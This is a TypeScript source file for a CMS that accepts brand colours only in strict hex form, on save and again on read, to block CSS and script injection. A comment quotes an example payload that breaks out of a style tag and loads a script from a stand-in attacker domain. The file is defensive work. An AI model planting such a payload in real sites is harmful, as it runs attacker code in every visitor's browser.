import { siteSettings } from '../i18n/labels'
import { pick } from '../i18n/locales'

/**
 * Brand colours are the one CMS value that reaches the page as CSS source
 * rather than as text: `BrandTheme` writes them into a `<style>` block on every
 * public route. React escapes text nodes, but `dangerouslySetInnerHTML` is by
 * definition unescaped, so a value like
 *
 *   #dc2626}</style><script src="https://evil.tld/x.js"></script><style>{
 *
 * would close the tag and run in every visitor's browser. Nothing downstream
 * can fix that — a stylesheet has no escaping syntax to apply — so the value has
 * to be rejected instead, both when it is saved and again when it is read.
 *
 * Hex is the only accepted form. `rgb()`, `oklch()` and `var()` are all
 * legitimate CSS, but they carry parentheses and commas, and admins paste hex
 * out of a brand guide; widening the grammar buys nothing and costs the
 * guarantee that the value cannot contain a delimiter.
 */

/** `#rgb`, `#rgba`, `#rrggbb` or `#rrggbbaa`, and nothing else. */
const HEX_COLOR = /^#(?:[0-9a-f]{3,4}|[0-9a-f]{6}|[0-9a-f]{8})$/i

/**
 * Subset of Payload's validate options this module reads. Kept structural so
 * the validator stays callable from unit tests without building a request.
 */
interface ValidateContext {
  req?: { i18n?: { language?: string } }
}

/**
 * Resolve the request language, falling back to English.
 *
 * @param options - Payload's validate options, absent in unit tests.
 */
function languageOf(options?: ValidateContext): string {
  return options?.req?.i18n?.language ?? ''
}

/**
 * Whether a value is a hex colour safe to interpolate into a stylesheet.
 *
 * @param value - The candidate colour.
 */
export function isBrandColor(value?: null | string): boolean {
  return typeof value === 'string' && HEX_COLOR.test(value.trim())
}

/**
 * Return the colour when it is a valid hex value, the fallback otherwise.
 *
 * This is the read-side half of the pair. The field validation below stops new
 * bad values, but it cannot clean a row saved before it existed, and a global
 * can also be written through the REST API by any editor. Every consumer of a
 * brand colour goes through here, so `BrandTheme` can treat what it receives as
 * a literal.
 *
 * @param value - The colour stored in the CMS.
 * @param fallback - The static default to fall back to.
 */
export function safeBrandColor(
  value: null | string | undefined,
  fallback: string
): string {
  return isBrandColor(value) ? (value as string).trim() : fallback
}

/**
 * Payload field validation for a brand colour. Empty values are valid — the
 * field is optional and falls back to the static default.
 *
 * @param value - The submitted colour.
 * @param options - Payload's validate options, used to resolve the language.
 */
export function validateBrandColor(
  value: null | string | undefined,
  options?: ValidateContext
): string | true {
  return (
    !value ||
    isBrandColor(value) ||
    pick(siteSettings.errors.color, languageOf(options))
  )
}
